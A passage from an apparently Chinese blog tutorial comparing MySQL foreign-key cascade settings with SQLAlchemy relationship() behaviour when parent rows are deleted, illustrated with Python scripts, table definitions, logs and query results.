级联模式,父表更新后,对应子表关联的数据也跟着被更新</li><li><code>on update set null</code>:置空模式,父表更新后,对应子表关联的外键值被设置为<code>NULL</code>,需要注意的是,如果子表的外键设置<code>not null</code> ,则不能使用这种模式.</li></ul></li></ul><hr><p>当使用<code>ORM</code>的<code>SQLAlchemy</code>时,在原生的<code>SQL</code>语句上又添加了一层约束<code>relationship</code>.</p></blockquote><h4 id="1-一对多模式中relationship的影响"><a href="#1-一对多模式中relationship的影响" class="headerlink" title="1.一对多模式中relationship的影响"></a>1.一对多模式中<code>relationship</code>的影响</h4><blockquote><p>创建如下两个对比文件:级联对比1,级联对比2</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 10级联对比1</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Cascade_Parent_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_parent_1'</span> id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设置双向关系</span> childs <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Child_1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">)</span><span class="token keyword">class</span>  <span class="token class-name">Cascade_Child_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_child_1'</span> id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 外键连接的是 表</span> p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'cascade_parent_1.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> parent <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Parent_1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'childs'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 11级联对比2</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Cascade_Parent_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_parent_2'</span> id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设置双向关系</span> childs <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Child_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">)</span><span class="token keyword">class</span>  <span class="token class-name">Cascade_Child_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_child_2'</span> id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 外键连接的是 表</span> p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'cascade_parent_2.id'</span><span class="token punctuation">,</span> ondelete<span class="token operator">=</span><span class="token string">'cascade'</span><span class="token punctuation">,</span> onupdate<span class="token operator">=</span><span class="token string">'cascade'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> parent <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Parent_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'childs'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建文件:</p><pre class="line-numbers language-bash"><code class="language-bash">$ python 10级联对比1.py$ python 11级联对比2.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到上面唯一的不同,就是指定外键的约束不同,查看<code>SQL</code>语句,可以更清晰的分辨(默认不指定情况下是<code>restrict</code>):</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">></span> <span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">table</span> cascade_child_1<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>cascade_child_1<span class="token punctuation">`</span> <span class="token punctuation">(</span>     <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>                                                             <span class="token punctuation">`</span>name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>                                                                  <span class="token punctuation">`</span>p_id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>                                                                      <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                                                               <span class="token keyword">KEY</span> <span class="token punctuation">`</span>p_id<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>p_id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                                                             <span class="token keyword">CONSTRAINT</span> <span class="token punctuation">`</span>cascade_child_1_ibfk_1<span class="token punctuation">`</span>     <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>p_id<span class="token punctuation">`</span><span class="token punctuation">)</span>     <span class="token keyword">REFERENCES</span> <span class="token punctuation">`</span>cascade_parent_1<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8 <span class="token operator">></span> <span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">table</span> cascade_child_2<span class="token punctuation">;</span> cascade_child_2 <span class="token operator">|</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>cascade_child_2<span class="token punctuation">`</span> <span class="token punctuation">(</span>      <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>       <span class="token punctuation">`</span>name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>     <span class="token punctuation">`</span>p_id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>     <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">KEY</span> <span class="token punctuation">`</span>p_id<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>p_id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token keyword">CONSTRAINT</span> <span class="token punctuation">`</span>cascade_child_2_ibfk_1<span class="token punctuation">`</span>     <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>p_id<span class="token punctuation">`</span><span class="token punctuation">)</span>     <span class="token keyword">REFERENCES</span> <span class="token punctuation">`</span>cascade_parent_2<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">)</span>     <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">CASCADE</span>     <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span> <span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>restrict</code>:父表不能删除一个已经被子表引用的记录</li><li><code>cascade</code>:父表删除后,子表数据也删除</li></ul><hr><p>现在我们尝试在两张表中添加数据,并使用<code>SQLAlchemy</code>去删除数据.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 10级联对比1</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 添加以下内容</span><span class="token comment" spellcheck="true"># 添加数据</span>p1 <span class="token operator">=</span> Cascade_Parent_1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> Cascade_Child_1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> Cascade_Child_1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c1<span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 双向关系,子表也可以添加数据</span>p2 <span class="token operator">=</span> Cascade_Parent_1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob'</span><span class="token punctuation">)</span>c3 <span class="token operator">=</span> Cascade_Child_1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c4 <span class="token operator">=</span> Cascade_Child_1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c3<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2c4<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c3<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c4<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 11级联对比2</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 添加以下内容</span><span class="token comment" spellcheck="true"># 添加数据</span>p1 <span class="token operator">=</span> Cascade_Parent_2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> Cascade_Child_2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> Cascade_Child_2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c1<span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 双向关系,子表也可以添加数据</span>p2 <span class="token operator">=</span> Cascade_Parent_2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob'</span><span class="token punctuation">)</span>c3 <span class="token operator">=</span> Cascade_Child_2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c4 <span class="token operator">=</span> Cascade_Child_2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c3<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2c4<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c3<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c4<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行程序</p><pre class="line-numbers language-bash"><code class="language-bash">$ python 10级联对比1.py$ python 11级联对比2.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以在数据库中查看并验证已经添加的数据:</p><pre class="line-numbers language-sql"><code class="language-sql">mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> cascade_child_1<span class="token punctuation">;</span>        <span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name        <span class="token operator">|</span> p_id <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+------+</span><span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Jack child1 <span class="token operator">|</span> <span class="token number">1</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> Jack child2 <span class="token operator">|</span> <span class="token number">1</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> Bob child1  <span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> Bob child2  <span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+------+</span>mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> cascade_child_2<span class="token punctuation">;</span>                 <span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name        <span class="token operator">|</span> p_id <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+------+</span><span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Jack child1 <span class="token operator">|</span> <span class="token number">1</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> Jack child2 <span class="token operator">|</span> <span class="token number">1</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> Bob child1  <span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> Bob child2  <span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>接下来尝试使用<code>SQLAlchemy</code>删除数据.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 10级联对比1</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 注释添加数据的内容</span><span class="token comment" spellcheck="true"># 添加以下内容</span><span class="token comment" spellcheck="true"># 尝试删除一条数据</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Cascade_Parent_1<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 11级联对比2</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 注释添加数据的内容</span><span class="token comment" spellcheck="true"># 添加以下内容</span><span class="token comment" spellcheck="true"># 尝试删除一条数据</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Cascade_Parent_1<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行程序:</p><pre class="line-numbers language-bash"><code class="language-bash">$ python 10级联对比1.py$ python 11级联对比2.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看<code>MySQL</code>日志,可以很明显的看到<code>set p_id =NULL</code>的语句</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> /mysql_data/localhost.log<span class="token punctuation">..</span><span class="token punctuation">..</span>2020-08-25T13:15:12.063798Z       37 Query    UPDATE cascade_child_1 SET p_id<span class="token operator">=</span>NULL WHERE cascade_child_1.id <span class="token operator">=</span> 12020-08-25T13:15:12.093034Z       37 Query    UPDATE cascade_child_1 SET p_id<span class="token operator">=</span>NULL WHERE cascade_child_1.id <span class="token operator">=</span> 22020-08-25T13:15:12.104037Z       37 Query    DELETE FROM cascade_parent_1 WHERE cascade_parent_1.id <span class="token operator">=</span> 12020-08-25T13:15:12.114879Z       37 Query    COMMIT<span class="token punctuation">..</span><span class="token punctuation">..</span>2020-08-25T13:15:17.618876Z       38 Query    UPDATE cascade_child_2 SET p_id<span class="token operator">=</span>NULL WHERE cascade_child_2.id <span class="token operator">=</span> 12020-08-25T13:15:17.621866Z       38 Query    UPDATE cascade_child_2 SET p_id<span class="token operator">=</span>NULL WHERE cascade_child_2.id <span class="token operator">=</span> 22020-08-25T13:15:17.635397Z       38 Query    DELETE FROM cascade_parent_2 WHERE cascade_parent_2.id <span class="token operator">=</span> 12020-08-25T13:15:17.638600Z       38 Query    COMMIT<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并且表中数据被清空</p><pre class="line-numbers language-sql"><code class="language-sql">mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> cascade_child_1<span class="token punctuation">;</span>                                   <span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+--------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name        <span class="token operator">|</span> p_id   <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+--------+</span><span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Jack child1 <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> Jack child2 <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> Bob child1  <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> Bob child2  <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+--------+</span>mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> cascade_child_2<span class="token punctuation">;</span>     <span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+--------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name        <span class="token operator">|</span> p_id   <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+--------+</span><span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Jack child1 <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> Jack child2 <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> Bob child1  <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token 